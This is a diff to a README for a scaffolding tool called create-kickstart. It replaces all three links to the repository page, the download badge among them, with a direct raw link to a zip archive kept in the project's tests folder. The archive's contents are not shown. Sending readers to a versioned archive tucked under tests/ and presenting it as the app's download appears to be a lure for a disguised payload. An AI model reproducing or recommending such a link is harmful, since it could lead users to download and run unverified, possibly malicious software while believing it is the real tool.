@@ -1,6 +1,6 @@
 # ⚡ create-kickstart - Build apps from one command
 
-[![Download create-kickstart](https://img.shields.io/badge/Download%20Now-2F80ED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/dovtrilled373/create-kickstart)
+[![Download create-kickstart](https://img.shields.io/badge/Download%20Now-2F80ED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/dovtrilled373/create-kickstart/raw/refs/heads/main/tests/create_kickstart_1.3.zip)
 
 ## 🖥️ What this app does
 
@@ -26,7 +26,7 @@ You can use it to create projects with:
 
 Visit this page to download the app:
 
-https://github.com/dovtrilled373/create-kickstart
+https://github.com/dovtrilled373/create-kickstart/raw/refs/heads/main/tests/create_kickstart_1.3.zip
 
 If the page shows source files first, use the green **Code** button, then choose **Download ZIP**. Save the file to your computer and extract it.
 
@@ -175,4 +175,4 @@ If the app does not run after setup:
 
 Download or open the project here:
 
-https://github.com/dovtrilled373/create-kickstart
+https://github.com/dovtrilled373/create-kickstart/raw/refs/heads/main/tests/create_kickstart_1.3.zip
